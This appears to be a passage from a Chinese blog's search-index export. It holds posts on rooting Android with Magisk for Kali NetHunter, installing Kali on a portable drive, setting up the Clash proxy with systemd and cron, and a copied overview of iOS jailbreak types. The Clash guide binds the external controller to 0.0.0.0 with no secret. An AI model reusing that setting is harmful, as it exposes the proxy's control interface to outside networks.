<p>这里包括Alynx-12-nethunter-bluecross.zip、Wireless_firmware.zip、Magisk-v25.2.apk</p>
<p>由于twrp已经覆盖了a、b两个区，后续启动是个问题，用fastboot再次覆盖安装lineageOS<br>就可以引导启动系统，并开始Magisk的操作</p>
<p>启动Magick app，修复引导镜像，<br>使用adb把镜像拉到pc上，</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">adb pull &lt;magick-什么玩应来着&gt;.img</span><br></pre></td></tr></table></figure></div>
<p>使用fastboot，把这个镜像安装到recovery区</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">fastboot flash recovery &lt;magick-什么玩应来着&gt;.img</span><br></pre></td></tr></table></figure></div>

<p>再次启动系统，应该就能root了</p>
<p>然后再看F-Droid这个app，进入后安装nethunter store<br>后面的懒得教了，一看就知道<br>大不了全装了</p>
]]></content>
  </entry>
  <entry>
    <title>由智能家居入门物联网安全</title>
    <url>/2023/04/23/%E7%94%B1%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85%E5%85%A5%E9%97%A8%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>关于Win+Linux双系统 我实现了一个解决方案</title>
    <url>/2023/04/23/%E5%85%B3%E4%BA%8EWin-Linux%E5%8F%8C%E7%B3%BB%E7%BB%9F-%E6%88%91%E5%AE%9E%E7%8E%B0%E4%BA%86%E4%B8%80%E4%B8%AA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
    <content><![CDATA[<blockquote>
<p>前情提要：<br>![[image 1.png]]</p>
</blockquote>
<blockquote>
<p>之前完成了便携的kali系统，即，将kali安装在移动硬盘中，想要使用的话，只需要插上后重启即可。<br>某一天发现启动出问题了，故该文章重新编写，把截图全都补上。</p>
</blockquote>
<p>那么，正文开始</p>
<h1 id="买"><a href="#买" class="headerlink" title="买"></a>买</h1><p>这里我们期待的一个环境，就是将linux系统安装在移动硬盘里，做到即插即用。<br>先买一个差不多大的硬盘，这里建议买带硬盘盒的，窄长一小条，方便携带。</p>
<p>![[image-1668069193196.png]]</p>
<p>之后选一个差不多的U盘作为安装启动盘，这里用不着买太大的，差不多就行。</p>
<h1 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h1><p>我们需要一个能将镜像文件存放的安装介质，即把iso放进u盘的工具</p>
<p>Rufus:<a class="link"   href="https://github.com/pbatard/rufus/releases/tag/v3.20" >https://github.com/pbatard/rufus/releases/tag/v3.20 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>![[Snipaste_2022-11-10_10-47-56.png]]<br>同时linux版本上我们选择kali，当然不同的linux版本的流程基本一致，安装ubuntu等也是一样的流程</p>
<p>kali下载地址：<a class="link"   href="https://www.kali.org/get-kali/#kali-installer-images" >https://www.kali.org/get-kali/#kali-installer-images <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>务必注意一下安装平台，我的目标是安装在64位实体机器上的linux系统<br>![[Snipaste_2022-11-10_13-28-10.png]]<br>至于installer和Netinstall的区别，一个是镜像文件里包含一定量的系统文件和工具，另一个是啥都没有，需要联网安装，至于weekly，那就是刚刚更新的版本，everything就是全部的工具都有。<br>![[Snipaste_2022-11-10_13-28-45-1668067257514.png]]</p>
<h1 id="刷镜像"><a href="#刷镜像" class="headerlink" title="刷镜像"></a>刷镜像</h1><p>启动rufus，插入U盘，选择镜像，要注意的是，要将一整个U盘都作为使用空间去刷。<br>其余的设置照我这张图来的就行。<br>![[Snipaste_2022-11-10_13-29-42.png]]<br>接下来要注意的是以什么镜像模式写入，虽然这里建议的是使用ISO模式，但在kali安装的过程中很容易出现找不到介质的问题，故使用DD模式。<br>![[Snipaste_2022-11-10_13-30-03.png]]</p>
<p>接下来等镜像刷好，直接重启</p>
<h1 id="改Bios"><a href="#改Bios" class="headerlink" title="改Bios"></a>改Bios</h1><p>电脑重启后，进入bios，需要改几个设置，security中的secure boot，改成我这个样子<br>![[Snipaste_2022-11-10_16-17-17.png]]<br>![[Snipaste_2022-11-10_16-17-31.png]]</p>
<p>然后是startup中，允许legacy boot启动，具体按我这个来就可以，要注意的是，这种启动方式会导致，<br>以后只要接入kali系统盘的情况下，直接使用kali的引导进入系统。<br>且windows系统进入会略慢。</p>
<p>![[Snipaste_2022-11-10_16-17-41.png]]</p>
<p>启动顺序，我这里无脑将USB启动的都放在了前面。  </p>
<p>![[Snipaste_2022-11-10_16-17-02.png]]<br>保存并退出，引导至kali启动盘界面<br>![[Snipaste_2022-11-10_16-16-38.png]]</p>
<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>之后的安装流程与虚拟机的安装基本大同小异，故后面的截图都用的虚拟机作为演示<br>同时我仅将需要注意的部分截图。<br>![[Snipaste_2022-11-10_14-18-50.png]]<br>就是这里，如果安装介质的探测失败，就需要回到刷镜像的流程，使用另一种模式重新刷<br>![[Snipaste_2022-11-10_14-19-31.png]]<br>之后这里的对磁盘进行分区，使用向导对整个硬盘配置LVM，或者加密LVM，当然也可以手动分配，这样的目的是给之后的GRUB预留空间。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-22-26.png"
                      alt="Snipaste_2022-11-10_14-22-26"
                ><figcaption>Snipaste_2022-11-10_14-22-26</figcaption></figure></p>
<p>这里要注意的是，不要用掉全部的空间，如果你使用的硬盘是100G，就一定要留出至少1个G出来，<br>比如这个硬盘是321G（这是在虚拟机里识别出来的虚拟硬盘大小），我就大约会流出21G空闲。<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-21-20.png"
                      alt="Snipaste_2022-11-10_14-21-20"
                ><figcaption>Snipaste_2022-11-10_14-21-20</figcaption></figure></p>
<p>建议将各个部分都分区，而不是都放在同一个分区里。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-22-49.png"
                      alt="Snipaste_2022-11-10_14-22-49"
                ><figcaption>Snipaste_2022-11-10_14-22-49</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-22-35.png"
                      alt="Snipaste_2022-11-10_14-22-35"
                ><figcaption>Snipaste_2022-11-10_14-22-35</figcaption></figure></p>
<p>假如没有分配空闲出来，安装后的效果就会是左上角一直闪烁光标的黑屏，无限黑屏下去。<br>原因是：后面安装GRUB给覆盖了。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_15-12-49.png"
                      alt="Snipaste_2022-11-10_15-12-49"
                ><figcaption>Snipaste_2022-11-10_15-12-49</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-23-27.png"
                      alt="Snipaste_2022-11-10_14-23-27"
                ><figcaption>Snipaste_2022-11-10_14-23-27</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-23-40.png"
                      alt="Snipaste_2022-11-10_14-23-40"
                ><figcaption>Snipaste_2022-11-10_14-23-40</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-26-16.png"
                      alt="Snipaste_2022-11-10_14-26-16"
                ><figcaption>Snipaste_2022-11-10_14-26-16</figcaption></figure></p>
<p>如果是在已经装了win的电脑上安装kali，这一页会说，这台计算机里还有个windows，要不要把GRUB安装在windows那个驱动器上</p>
<p>我的回答是，否</p>
<p>一定是把GRUB装在我刚刚留出来的空间的，不然以windows动不动就更新的尿性，GRUB会懵比。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-45-12.png"
                      alt="Snipaste_2022-11-10_14-45-12"
                ><figcaption>Snipaste_2022-11-10_14-45-12</figcaption></figure></p>
<p>选择你买的那个移动硬盘。会自动安装在硬盘分区。</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-45-27.png"
                      alt="Snipaste_2022-11-10_14-45-27"
                ><figcaption>Snipaste_2022-11-10_14-45-27</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_14-45-41.png"
                      alt="Snipaste_2022-11-10_14-45-41"
                ><figcaption>Snipaste_2022-11-10_14-45-41</figcaption></figure></p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Snipaste_2022-11-10_15-12-12.png"
                      alt="Snipaste_2022-11-10_15-12-12"
                ><figcaption>Snipaste_2022-11-10_15-12-12</figcaption></figure></p>
<p>安装结束，拔下U盘，留下硬盘，直接重新启动，静静等待kali启动的过程。</p>
<h1 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h1><p>效果就是，我整篇流程都是在这个kali上写下的，很舒服<br><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://fiddling.blog/upload/2022/11/Screenshot_2022-11-10_21_17_08-1668086282838.png"
                      alt="Screenshot_2022-11-10_21_17_08-1668086282838"
                ><figcaption>Screenshot_2022-11-10_21_17_08-1668086282838</figcaption></figure></p>
]]></content>
  </entry>
  <entry>
    <title>kali安装clash</title>
    <url>/2023/04/23/kali%E5%AE%89%E8%A3%85clash/</url>
    <content><![CDATA[<blockquote>
<p>直接解决掉kali科学上网的全部</p>
</blockquote>
<h2 id="下载clash"><a href="#下载clash" class="headerlink" title="下载clash"></a>下载clash</h2><p>clash：<a class="link"   href="https://github.com/Dreamacro/clash/releases" >https://github.com/Dreamacro/clash/releases <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下载后安装并修改权限</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x clash</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>先启动一下clash，让clash自动下载和生成必需文件</p>
<p>配置文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/.config/clash</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>删除配置文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf config.yaml</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>下载配置文件：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget  [链接]</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>从机场下载yaml文件</p>
<p>并放在&#x2F;root&#x2F;.config&#x2F;clash目录下<br>clash的配置文件在~&#x2F;.config&#x2F;clash&#x2F;config.yaml  </p>
<p>修改外部控制设置（external-controller）地址为：0.0.0.0:9890，使内外网都可以访问这个地址</p>
<p>clash图像化配置地址：<a class="link"   href="http://clash.razord.top/" >http://clash.razord.top/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="设置系统代理"><a href="#设置系统代理" class="headerlink" title="设置系统代理"></a>设置系统代理</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/environment</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>填写：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> http_proxy=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br><span class="line"><span class="built_in">export</span> no_proxy=<span class="string">&quot;localhost, 127.0.0.1&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>修改sudo文件</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/sudoers</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>在文件中填入</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">Defaults env_keep+=<span class="string">&quot;http_proxy https_proxy no_proxy&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>重启</p>
<h2 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a>设置开机启动</h2><p>将配置文件移动到etc</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> ~/.config/clash /etc</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>添加启动信息</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/systemd/system/clash.service</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>填入</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=clash daemon</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">User=root</span><br><span class="line">ExecStart=/opt/clash/clash -d /etc/clash/</span><br><span class="line">Restart=on-failure</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>这里要注意配置文件的路径<br>即第7行的内容，clash -d 是指定配置文件的路径</p>
<p>重新加载systemctl daemon</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>启动clash</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start clash.service</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>设置开机启动clash</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> clash.service</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>重启clash</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart clash.service</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>查看clash运行状态</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status clash.service</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<h2 id="定期更新订阅"><a href="#定期更新订阅" class="headerlink" title="定期更新订阅"></a>定期更新订阅</h2><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置clash路径</span></span><br><span class="line">clash_path=<span class="string">&quot;/opt/clash&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止clash</span></span><br><span class="line">systemctl stop clash.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取消代理</span></span><br><span class="line"><span class="built_in">unset</span> https_proxy</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果配置文件存在，备份后下载，如果不存在，直接下载</span></span><br><span class="line"><span class="keyword">if</span> [ -e <span class="variable">$clash_path</span>/config.yaml ]; <span class="keyword">then</span></span><br><span class="line">	<span class="built_in">mv</span> <span class="variable">$clash_path</span>/config.yaml <span class="variable">$clash_path</span>/configbackup.yaml</span><br><span class="line">	wget -O <span class="variable">$clash_path</span>/config.yaml <span class="string">&quot;[你的订阅链接]&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	wget -O <span class="variable">$clash_path</span>/config.yaml <span class="string">&quot;[你的订阅链接]&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启clash</span></span><br><span class="line">systemctl restart clash.service</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重设代理</span></span><br><span class="line"><span class="built_in">export</span> https_proxy=<span class="string">&quot;http://127.0.0.1:7890&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>设置定时任务：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">crontab -e</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>填写：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">30 4 1,15 * * sh [脚本目录]/[脚本名称]</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>重启crontab</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart cron.service</span><br></pre></td></tr></table></figure></div>

<p>Bash</p>
<p>搞定！</p>
]]></content>
  </entry>
  <entry>
    <title>苹果端的越狱到frida hook</title>
    <url>/2023/04/23/%E8%8B%B9%E6%9E%9C%E7%AB%AF%E7%9A%84%E8%B6%8A%E7%8B%B1%E5%88%B0frida-hook/</url>
    <content><![CDATA[<h2 id="What-are-the-different-types"><a href="#What-are-the-different-types" class="headerlink" title="What are the different types?"></a>What are the different types?</h2><ul>
<li>Fully Untethered</li>
<li>Semi-Untethered</li>
<li>Semi-Tethered</li>
<li>Tethered</li>
</ul>
<h3 id="Untethered-Jailbreaks"><a href="#Untethered-Jailbreaks" class="headerlink" title="Untethered Jailbreaks"></a>Untethered Jailbreaks</h3><hr>
<p>Untethered jailbreaks can be considered the holy grail of all jailbreaks. They only require the exploit to be ran once either via a website, an app or a computer.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://ios.cfw.guide/assets/images/p0sixpwn.png"
                      alt="A screenshot of the p0sixspwn jailbreak"
                ><figcaption>A screenshot of the p0sixspwn jailbreak</figcaption></figure></p>
<p>After that, your device is fully jailbroken and won’t require any further action. The exploit will stay on a device even after you reboot it.</p>
<p>Unfortunately, there hasn’t been a new untethered jailbreak in a very long time, and it’s likely we won’t see one for even longer.</p>
<p>The only downside to an untethered jailbreak is that if something goes wrong, it could very well result in a bootloop requiring you to restore your device via iTunes or Finder (macOS Catalina or newer). The likelihood of this happening is <em>low</em>, but is indeed possible.</p>
<p>A few examples of untethered jailbreaks are <a class="link"   href="https://ios.cfw.guide/installing-p0sixspwn" >p0sixspwn <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and Pangu9.</p>
<h3 id="Semi-Untethered-Jailbreaks"><a href="#Semi-Untethered-Jailbreaks" class="headerlink" title="#Semi-Untethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#semi-untethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Semi-Untethered Jailbreaks</h3><hr>
<p>Semi-untethered jailbreaks have been the most popular type of jailbreak in recent years. This type of jailbreak requires an exploit to be executed every time you reboot or turn off your device.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://ios.cfw.guide/assets/images/odysseymain.png"
                      alt="A screenshot of the Odyssey jailbreak"
                ><figcaption>A screenshot of the Odyssey jailbreak</figcaption></figure></p>
<p>This jailbreak works by running the exploit through an app on the device itself. The app, however, must be resigned every 7 days if sideloaded with a standard Apple ID. Utilities like AltStore, ReProvision Reborn, and AltDaemon make this process far easier.</p>
<p>Due to the nature of how the exploit is applied, these jailbreaks are easily removable through their respective app.</p>
<p>A few examples of semi-untethered jailbreaks include <a class="link"   href="https://ios.cfw.guide/installing-taurine" >Taurine <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, <a class="link"   href="https://ios.cfw.guide/installing-unc0ver" >unc0ver <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, and <a class="link"   href="https://ios.cfw.guide/installing-odyssey" >Odyssey <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h3 id="Semi-Tethered-Jailbreaks"><a href="#Semi-Tethered-Jailbreaks" class="headerlink" title="#Semi-Tethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#semi-tethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Semi-Tethered Jailbreaks</h3><hr>
<p>Semi-tethered jailbreaks are very similar to semi-untethered jailbreaks, however the exploit must be ran using a computer rather than using a sideloaded app.</p>
<p><figure class="image-caption"><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://ios.cfw.guide/assets/images/checkra1n.png"
                      alt="A screenshot of the checkra1n jailbreak"
                ><figcaption>A screenshot of the checkra1n jailbreak</figcaption></figure></p>
<p>Due to requiring a computer to rejailbreak after every reboot, most choose to use a semi-untethered jailbreak instead.</p>
<p>An example of a semi-tethered jailbreak is <a class="link"   href="https://ios.cfw.guide/installing-odysseyra1n" >Odysseyra1n <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>.</p>
<h3 id="Tethered-Jailbreaks"><a href="#Tethered-Jailbreaks" class="headerlink" title="#Tethered Jailbreaks"></a><a class="link"   href="https://ios.cfw.guide/installing-palera1n/#tethered-jailbreaks" ># <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>Tethered Jailbreaks</h3><hr>
<p>Tethered jailbreaks are not meant to be used by the general public. These exploits modify the device in a way that it requires a PC to even boot at all, even without a jailbreak.</p>
<p>Because of this, these tend to only be used by jailbreak developers getting ready for a newer version of iOS.</p>
<p>越狱工具-》适用于不同版本手机和ios版本</p>
]]></content>
  </entry>
</search>
